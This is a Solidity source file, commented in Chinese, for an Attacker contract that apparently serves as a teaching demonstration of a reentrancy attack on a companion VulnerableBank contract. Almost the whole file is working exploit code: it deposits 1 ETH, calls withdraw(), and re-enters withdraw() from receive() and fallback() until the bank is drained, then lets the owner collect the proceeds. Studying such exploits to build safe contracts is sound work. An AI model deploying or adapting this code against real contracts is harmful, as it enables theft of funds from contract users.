// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev 利用重入漏洞攻击 VulnerableBank 的恶意合约
 * 
 * 攻击流程：
 * 1. 攻击者调用 attack()，向银行存入 1 ETH
 * 2. 攻击者调用银行的 withdraw() 取出 1 ETH
 * 3. 银行向攻击者发送 1 ETH，触发 receive() 函数
 * 4. receive() 函数再次调用 withdraw()
 * 5. 由于银行尚未更新攻击者的余额，检查通过，继续发送 ETH
 * 6. 重复步骤 3-5，直到银行余额耗尽
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    
    // 记录攻击次数（用于调试和验证）
    uint256 public attackCount;
    
    /**
     * @dev 构造函数
     * @param _vulnerableBankAddress 目标银行合约地址
     */
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev 发起攻击
     * 攻击者只需投入少量 ETH，即可盗取银行中的大量资金
     */
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to attack");
        
        // 1. 先存款到银行（获得合法身份）
        vulnerableBank.deposit{value: ATTACK_AMOUNT}();
        
        // 2. 立即取款，触发重入攻击
        vulnerableBank.withdraw(ATTACK_AMOUNT);
    }
    
    /**
     * @dev 接收 ETH 时的回调函数 - 重入攻击的核心！
     * 每次接收到 ETH 时都会被调用
     */
    receive() external payable {
        attackCount++;
        
        // 检查银行还有没有足够的余额继续攻击
        uint256 bankBalance = address(vulnerableBank).balance;
        
        // 只在银行余额 >= 1 ETH 时继续攻击
        if (bankBalance >= ATTACK_AMOUNT) {
            // 重入！再次调用 withdraw
            vulnerableBank.withdraw(ATTACK_AMOUNT);
        }
    }
    
    /**
     * @dev 备用接收函数
     */
    fallback() external payable {
        // 同样触发重入攻击
        if (address(vulnerableBank).balance >= ATTACK_AMOUNT) {
            attackCount++;
            vulnerableBank.withdraw(ATTACK_AMOUNT);
        }
    }
    
    /**
     * @dev 查询攻击合约的余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev 提取攻击所得的 ETH
     */
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}

